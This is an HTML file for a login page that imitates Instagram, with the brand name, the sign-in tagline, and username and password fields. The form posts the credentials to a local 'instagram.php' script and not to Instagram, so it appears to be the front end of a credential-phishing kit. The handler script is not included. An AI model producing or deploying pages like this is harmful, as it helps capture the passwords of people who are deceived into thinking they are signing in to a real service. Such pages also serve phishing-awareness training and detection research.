<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="style.css">
    <!-- Optional: Add a favicon -->
    <link rel="icon" type="image/x-icon" href="favicon.ico">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Instagram</h1>
            <p>Sign in to see photos and videos from your friends.</p>
        </div>
        <div class="login-box">
            <!-- Form action points to the PHP script -->
            <form action="instagram.php" method="POST">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
                <a href="#">Forgot password?</a>
                <hr>
                <button type="button" class="create-account">Sign up</button>
            </form>
        </div>
    </div>
    <!-- Optional: Add JavaScript for interactivity -->
    <script src="script.js"></script>
</body>
</html>
